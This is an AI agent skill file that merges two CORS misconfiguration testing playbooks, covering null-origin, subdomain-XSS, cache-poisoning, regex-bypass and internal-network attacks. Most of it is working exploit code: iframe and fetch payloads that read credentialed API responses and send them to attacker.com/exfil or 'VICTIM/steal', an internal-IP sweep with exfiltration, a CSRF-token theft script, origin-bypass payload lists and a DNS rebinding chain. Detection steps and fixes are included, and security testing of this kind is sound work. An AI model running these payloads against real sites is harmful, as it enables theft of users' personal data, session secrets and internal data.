---
name: cors-misconfiguration
description: "CORS misconfiguration testing playbook. Use when analyzing cross-origin trust, credentialed browser reads, origin reflection, preflight policy bugs, and browser-based access to authenticated APIs."
domain: client-side
merged: true
merged_from: [hack-skills:cors-cross-origin-misconfiguration, hacking-skills:cors-misconfig]
---

# cors-misconfiguration

> **Fusionierter Skill** — vereint 2 Quell-Skills zu einem: `hack-skills:cors-cross-origin-misconfiguration`, `hacking-skills:cors-misconfig`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: hack-skills — cors-cross-origin-misconfiguration (270 Zeilen)

# SKILL: CORS Misconfiguration — Credentialed Origins, Reflection, and Trust Boundary Errors

> **AI LOAD INSTRUCTION**: Use this skill when browsers can access authenticated APIs cross-origin. Focus on reflected origins, credentialed requests, wildcard trust, parser mistakes, and origin allowlist bypasses. For JSONP hijacking deep dives, same-origin policy internals, honeypot de-anonymization, and CORS vs JSONP comparison, load the companion [SCENARIOS.md](./SCENARIOS.md).

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- JSONP hijacking complete attack scenario — watering hole + `<script>` cross-origin data theft
- Honeypot de-anonymization via JSONP — use social platform JSONP endpoints to identify anonymous visitors
- Same-origin policy deep dive — protocol/hostname/port definition, `document.domain` subdomain relaxation and its security risks
- CORS vs JSONP technical comparison — methods, error handling, credential behavior, migration path
- CORS exploitation payloads — reflected origin with `credentials: include`, null origin via sandboxed iframe
- Dual-site attack lab pattern — localhost:8981 (target) + localhost:8982 (attacker) testing setup

## 1. WHEN TO LOAD THIS SKILL

Load when:

- Responses contain `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, or preflight headers
- A browser-based attack path might read authenticated API responses
- JSON endpoints appear protected from CSRF but are readable cross-origin

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| wildcard with credentials | `Access-Control-Allow-Origin: *` plus credential support or equivalent broken behavior |
| reflected origin | server echoes arbitrary `Origin` |
| weak allowlist | suffix, prefix, substring, regex, or mixed-case matching errors |
| `null` origin | acceptance of sandboxed, file, or serialized origins |
| preflight trust | overbroad methods and headers |
| internal API exposure | admin or tenant data readable cross-origin |

## 3. QUICK TRIAGE

1. Send crafted `Origin` headers and inspect reflection.
2. Test with and without credentials.
3. Probe allowlist bypasses using attacker subdomains and parser edge cases.
4. If readable data is sensitive, chain to account or tenant impact.

## 4. RELATED ROUTES

- Session or JSON action abuse: [csrf cross site request forgery](../csrf-cross-site-request-forgery/SKILL.md)
- OAuth token leakage and callback binding: [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)
- API auth context: [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md)

---

## 5. NULL ORIGIN EXPLOITATION

### How `Origin: null` is sent

| Context | Origin Header Value |
|---------|-------------------|
| Sandboxed iframe (`<iframe sandbox>`) | `null` |
| `data:` URI scheme | `null` |
| `file:` protocol (local HTML) | `null` |
| Cross-origin redirect chain (some browsers) | `null` |
| Serialized data in `blob:` URL from opaque origin | `null` |

### Exploitation

If the server includes `null` in its origin allowlist or reflects it:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(d))));
</script>
"></iframe>
```

The sandboxed iframe sends `Origin: null` → server reflects `null` → attacker reads credentialed response.

---

## 6. SUBDOMAIN XSS → CORS BYPASS CHAIN

### Attack flow

```text
1. Target API at api.target.com allows CORS from *.target.com
2. Find XSS on any subdomain: blog.target.com, dev.target.com, etc.
3. Exploit XSS to make credentialed requests to api.target.com
4. CORS allows the request → attacker reads sensitive API responses
```

### PoC (injected via XSS on blog.target.com)

```javascript
fetch('https://api.target.com/v1/user/profile', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    navigator.sendBeacon('https://attacker.com/exfil',
        JSON.stringify(data));
});
```

### Why this works

- `blog.target.com` is **same-site** with `api.target.com` → `SameSite` cookies sent
- CORS allowlist includes `*.target.com` → `Access-Control-Allow-Origin: https://blog.target.com`
- Combined: SameSite bypass + CORS read = full API access from XSS on any subdomain

### Reconnaissance for this chain

```text
□ Enumerate subdomains (amass, subfinder, crt.sh)
□ Test each for XSS (stored, reflected, DOM)
□ Check if API CORS accepts subdomain origins
□ Subdomain takeover candidates also qualify
```

---

## 7. VARY: ORIGIN CACHING ISSUE

### Problem

When the server reflects `Origin` in `Access-Control-Allow-Origin` but does **not** include `Vary: Origin` in the response, intermediary caches (CDN, reverse proxy) may serve the same cached response to different origins:

```text
1. Attacker requests: Origin: https://attacker.com
   Response cached with: Access-Control-Allow-Origin: https://attacker.com

2. Victim requests same URL (no Origin or different Origin)
   Cache serves response with: Access-Control-Allow-Origin: https://attacker.com
   → Victim's browser allows attacker.com to read the response (CORS cache poisoning)
```

### Detection

```bash
# Request 1: with attacker origin
curl -H "Origin: https://evil.com" https://target.com/api/data -I

# Request 2: with legitimate origin
curl -H "Origin: https://target.com" https://target.com/api/data -I

# Compare: if both responses have Access-Control-Allow-Origin: https://evil.com
# → cache poisoned, Vary: Origin is missing
```

### Exploitation

```text
1. Warm the cache: send request with Origin: https://attacker.com
2. Wait for victim to access the same cached URL
3. Cached ACAO header allows attacker.com to read the response
4. Attacker page fetches the URL → reads cached response with credentials
```

### Fix verification

```text
□ Response includes Vary: Origin
□ Cache key includes the Origin header
□ Alternatively: Access-Control-Allow-Origin is not reflected (hardcoded allowlist)
```

---

## 8. REGEX BYPASS PATTERNS

Common flawed regex patterns for origin validation:

| Intended Pattern | Flaw | Bypass Origin |
|-----------------|------|---------------|
| `^https?://.*\.target\.com$` | `.*` matches anything including `-` | `https://attacker-target.com` |
| `^https?://.*target\.com$` | Missing anchor after subdomain | `https://nottarget.com`, `https://attacker.com/.target.com` |
| `target\.com` (substring match) | No anchors | `https://attacker.com?target.com` |
| `^https?://(.*\.)?target\.com$` | Missing port restriction | `https://target.com.attacker.com:443` |
| `^https://[a-z]+\.target\.com$` | Missing end anchor for path | N/A (but misses subdomains with `-` or digits) |
| Backtracking-vulnerable regex | ReDoS | `https://aaaa...aaa.target.com` (CPU exhaustion) |

### Test payloads for origin validation bypass

```text
https://attacker.com/.target.com
https://target.com.attacker.com
https://attackertarget.com
https://target.com%60attacker.com
https://target.com%2F@attacker.com
https://attacker.com#.target.com
https://attacker.com?.target.com
null
```

### Advanced: Unicode normalization bypass

```text
https://target.com → https://ⓣarget.com (Unicode homoglyph)
```

Some origin validators normalize Unicode after comparison, while the browser sends the original — or vice versa.

---

## 9. INTERNAL NETWORK CORS EXPLOITATION

### Scenario

An internal-only API (e.g., `http://192.168.1.100:8080/admin`) is configured with:
```http
Access-Control-Allow-Origin: *
```

Internal APIs often use wildcard CORS because "only internal users can reach it."

### Attack chain

```text
1. Attacker sends victim (internal employee) a link to attacker.com
2. Attacker page JavaScript fetches internal API:
   fetch('http://192.168.1.100:8080/admin/users')
3. CORS allows * → response readable
4. Exfiltrate internal data to attacker server
```

```javascript
// On attacker.com — target internal API from victim's browser
const internalAPIs = [
    'http://192.168.1.1/admin/config',
    'http://10.0.0.1:8080/api/users',
    'http://172.16.0.1:9200/_cat/indices',  // Elasticsearch
    'http://localhost:8500/v1/agent/members', // Consul
];

internalAPIs.forEach(url => {
    fetch(url)
        .then(r => r.text())
        .then(data => {
            navigator.sendBeacon('https://attacker.com/exfil',
                JSON.stringify({url, data}));
        })
        .catch(() => {});
});
```

### Port scanning via CORS timing

Even without `Access-Control-Allow-Origin: *`, the attacker can infer internal service availability:
- **Port open**: connection established → CORS error (different timing)
- **Port closed**: connection refused → fast error
- **Host down**: timeout → slow error

### Combined with DNS rebinding

```text
1. Attacker controls attacker.com with short TTL (e.g., 0 or 1)
2. First DNS resolution: attacker.com → attacker's IP (serves malicious JS)
3. Second DNS resolution: attacker.com → 192.168.1.100 (internal IP)
4. JavaScript on the page fetches attacker.com/admin → now hits internal server
5. Same-origin policy satisfied (same domain) → response readable
```

## Quelle: hacking-skills — cors-misconfig (124 Zeilen)

# CORS Misconfiguration

## What Is Broken and Why
Cross-Origin Resource Sharing (CORS) extends the same-origin policy to allow controlled cross-origin requests. Misconfigurations arise when servers reflect arbitrary `Origin` values in `Access-Control-Allow-Origin` without validation, allow `null` origins (exploitable via sandboxed iframes), or combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (which browsers reject per spec but server-side logic may still honor insecurely). An attacker exploiting a CORS misconfiguration can read authenticated API responses from a victim's browser, leaking session data, PII, CSRF tokens, and other sensitive information.

## Key Signals
- `Access-Control-Allow-Origin` mirrors the `Origin` request header verbatim
- `Access-Control-Allow-Origin: *` on endpoints returning sensitive data (even without credentials, if the data is public-sensitive)
- `Access-Control-Allow-Credentials: true` combined with origin reflection
- `Access-Control-Allow-Origin: null` — exploitable via sandboxed iframe
- Wildcard subdomain trust: any `*.example.com` origin accepted, including attacker-controlled subdomains
- Missing `Vary: Origin` header indicating improper caching of CORS responses

## Methodology
1. Identify API endpoints and sensitive data responses.
2. Add `Origin: https://attacker-controlled.com` to requests; check if it is reflected in `Access-Control-Allow-Origin`.
3. Add `Origin: null`; check if `Access-Control-Allow-Origin: null` is returned.
4. Check `Access-Control-Allow-Credentials: true` — if combined with origin reflection, full exploitation is possible.
5. Test subdomain variations: `Origin: https://evil.TARGET-DOMAIN` to check for overly broad subdomain trust.
6. Test with OWASP ZAP's passive and active scanner for automated CORS header analysis.
7. Build a PoC with `fetch()` and `credentials: include` from an attacker page to confirm read access.

## Payloads & Tools
```
# Manual header injection test
curl -s -H "Origin: https://attacker.com" \
     -H "Cookie: session=TOKEN" \
     -v TARGET/api/user-data 2>&1 | grep -i "access-control"

# Check for null origin acceptance
curl -s -H "Origin: null" TARGET/api/sensitive-data -v 2>&1 | grep -i "access-control"

# Check for subdomain trust
curl -s -H "Origin: https://evil.target-domain.com" TARGET/api/data -v 2>&1 | grep access-control

# JavaScript PoC — origin reflection with credentials
<script>
fetch('https://TARGET/api/account', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  fetch('https://VICTIM/steal?d=' + encodeURIComponent(data));
});
</script>

# JavaScript PoC — null origin via sandboxed iframe
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
fetch('https://TARGET/api/account', {credentials: 'include'})
.then(r => r.text())
.then(d => top.location = 'https://VICTIM/steal?d=' + encodeURIComponent(d));
</script>"></iframe>

# CORS misconfiguration leading to CSRF token read
<script>
fetch('https://TARGET/account/settings', {credentials: 'include'})
.then(r => r.text())
.then(html => {
  var csrfToken = html.match(/csrf[_-]?token.*?value="([^"]+)"/i)[1];
  // Now use csrfToken to submit CSRF-protected forms
  fetch('https://VICTIM/steal?t=' + csrfToken);
});
</script>

# ZAP — Active scan for CORS
# Analyze -> Active Scan -> run against target; check Alerts for CORS issues
```

## Bypass Techniques
- `null` origin via sandboxed iframes or `data:` URI documents (bypasses many origin allowlists)
- Subdomain exploitation: if `*.target.com` is trusted and any subdomain is takeover-able, that subdomain can read responses
- HTTP/HTTPS mixing: `Origin: http://target.com` may be accepted by `https://target.com`
- Prefix/suffix matching bugs: server checking `endsWith('.target.com')` trusts `attacker.target.com.evil.com`
- Protocol confusion: some servers normalize origins before comparison

## Exploitation Scenarios
**Scenario 1 — Account Data Exfiltration**
Setup: `/api/user-profile` returns full user PII; server reflects any `Origin` with `Access-Control-Allow-Credentials: true`.
Trigger: Attacker hosts page with `fetch('TARGET/api/user-profile', {credentials: 'include'})` → exfiltrates response.
Impact: Victim's name, email, phone number, and account details sent to attacker on page visit.

**Scenario 2 — CSRF Token Theft Enabling CSRF**
Setup: CSRF-protected form's token is embedded in a JSON API response on an endpoint with CORS origin reflection.
Trigger: Attacker reads `/api/form-data` cross-origin, extracts CSRF token, then submits forged state-change request with valid token.
Impact: CSRF protection bypassed entirely; attacker performs arbitrary authenticated actions.

**Scenario 3 — Internal API Access via Null Origin**
Setup: Internal API at `/internal/admin-data` accepts `Origin: null` due to developer testing configuration left in production.
Trigger: Attacker uses sandboxed iframe to send request with `Origin: null` and `credentials: include`.
Impact: Internal admin data returned to attacker-controlled page.

## False Positives
- `Access-Control-Allow-Origin: *` on public API endpoints with no sensitive data and no credential support
- CORS headers present but `Access-Control-Allow-Credentials` absent (cookies not sent, data may be non-sensitive)
- Origin reflection with allowlist validation happening before header is set (check server-side code, not just headers)
- Pre-flight OPTIONS responses showing permissive headers that are more restrictive on actual GET/POST

## Fix Patterns
- Maintain an explicit server-side allowlist of permitted origins; never reflect the `Origin` header verbatim
- Never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
- Return `Access-Control-Allow-Origin: null` only intentionally (avoid in production)
- Add `Vary: Origin` header when the response differs by origin (prevents cache poisoning)
- For APIs: use `Content-Type: application/json` requirement and validate all CORS origins per request
- Audit subdomain CORS trust — each trusted subdomain is an expansion of the attack surface

## Related Skills

[[csrf]] and CORS misconfiguration are tightly coupled: a CORS origin-reflection bug lets an attacker read CSRF tokens cross-origin, turning a CSRF-protected form into an exploitable target. When [[ssrf]] and CORS coexist, the server's trusted position in the internal network can be leveraged similarly — both attacks abuse trust boundaries. A [[dom-xss]] on a CORS-trusted origin can exfiltrate data from the victim's authenticated API responses. Subdomain CORS trust also expands the scope of [[cookie-attacks]] because subdomain XSS can set or read parent-domain cookies.
